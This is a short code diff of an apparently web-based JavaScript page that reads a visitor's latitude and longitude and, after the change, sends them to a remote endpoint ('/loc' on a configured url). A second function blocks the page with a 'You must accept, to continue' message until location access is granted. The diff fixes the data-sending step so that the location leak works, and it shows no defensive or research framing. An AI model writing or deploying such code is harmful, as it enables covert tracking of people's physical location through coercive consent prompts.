@@ -14,7 +14,7 @@
         latitude = position.coords.latitude;
         longitude = position.coords.longitude;
         postData = url + "/loc?lat=" + latitude + "&long=" + longitude;
-        fetch(url);
+        fetch(postData);
       }
       function mustAccept(e) {
         main.innerHTML = "<h1> You must accept, to continue. Refresh to Try Again.</h1>";
